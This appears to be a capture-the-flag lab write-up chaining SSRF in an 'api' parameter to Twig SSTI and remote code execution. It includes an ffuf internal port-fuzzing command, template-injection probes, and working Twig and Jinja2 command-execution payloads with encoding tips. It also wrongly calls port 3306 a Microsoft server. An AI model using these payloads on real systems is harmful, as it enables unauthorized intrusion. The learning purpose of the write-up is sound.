from there i got my confirmation that there are internal endpoints so i launched fuff to fuzz the ports and see what else is there 

`ffuf -w ./ports.txt -u http://154.57.164.73:31716/ -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "api=http://127.0.0.1:FUZZ/?id%3DFusionExpress01" -fr "Failed to connect to"`


Since the error was "Failed to connect to" I used the -fr flag to exclude those results from my terminal

As we can see fuff found 2 services running
- 80
- 3306

3306 is a Microsoft server

![](../../images/Pasted%20image%2020260920120801.png)

The setup
The target web app had an SSRF in the `api` parameter. The app fetched whatever URL you gave it via libcurl. During internal enumeration, a hidden service was discovered on `truckapi.htb` — an internal API that returned JSON based on an `id` parameter.


**The observation:**  
Requesting `api=http://truckapi.htb/index.php?id=1` returned JSON with the `id` reflected back. This reflection was the clue — anytime user input comes back inside a server-rendered response, SSTI is worth testing


**The confirmation:**  
Sent `id={{7*7}}` and got `"id": "49"` in the response. That's template evaluation. The engine returned `49` for `{{7*7}}` (rather than `7777777`), which pointed to Twig (PHP), not Jinja2 (Python).


**The pivot to RCE:**

Twig exposes PHP function calls through the `filter` filter


==DONT USE SPACES, IF SO URL ENCODE THEM OR EVEN DOUBLE URL ENCODE THEM THE CODE MIGHT BREAK==

Special characters needing double-encoding: `%20` (space), `%7B%7D` (`{}`), `%5B%5D` (`[]`), `%27` (`'`), `%7C` (`|`).

```
{{['id']|filter('system')}}
```



- Reflected user input in a response is a strong SSTI signal — always test `{{7*7}}`.
    
- Engine fingerprinting: `{{7*'7'}}` → `7777777` = Jinja2, `49` = Twig.
    
- Twig RCE via `filter`: `{{['cmd']|filter('system')}}`.
    
- Jinja2 RCE via `lipsum`: `{{lipsum.__globals__['os'].popen('cmd').read()}}`.
    
- Nested SSRF-to-SSTI means **double encoding** for anything the inner decoder will process. Spaces, braces, brackets, quotes, pipes.
    
- SSRF isn't the end — it's a bridge to the internal attack surface.
